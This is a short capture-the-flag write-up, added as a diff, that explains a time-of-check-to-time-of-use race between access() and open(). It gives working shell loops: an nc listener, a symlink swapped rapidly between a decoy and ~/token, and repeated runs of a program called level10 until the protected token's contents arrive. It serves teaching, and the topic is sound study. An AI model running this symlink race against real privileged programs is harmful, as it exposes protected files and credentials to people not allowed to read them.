@@ -1,0 +1,29 @@
+The idea is to take advantage of the vulnerability of the access function.
+This vulnerability is taking advantage of the delay beetween the timing of the access() check
+and the timing of use of the file.
+
+Explaination :
+
+Let's supose that you check the Read access of a file with access() and then 10 ms after you open the file with open()
+if you create a file 'text.txt' that have the read permission, the access() will return 0 and the program continue
+but if after the access(), beetween the access() and the open(), you change the file by making it a symlink of an other file 'nonread.txt' that you dont have the read access on it,
+the file 'nonread.txt' will be opened and you will gain acces on what's inside of it, this attack is named TOCTOU :
+
+Time Of Check, Time Of Use
+
+
+setup :
+first create a decoy file like so: echo whatever > /tmp/toctou
+
+then run on different terminals:
+
+terminal 1 :
+while true; do nc -l 6969; done ---- (will create a serv on port 6969)
+
+terminal 2:
+while true; do ln -sf /tmp/toctou /tmp/exploit; ln -sf ~/token /tmp/exploit; done ---- (loop change the symlink of /tmp/exploit quickly to get the timing beetween accept() and open())
+
+terminal 3 :
+while true; do ./level10 /tmp/exploit 127.0.0.1; done ---- (loop exec the program with /tmp/exploit because the program exit on access() error)
+
+and then you will get the flag10 password in the terminal 1.
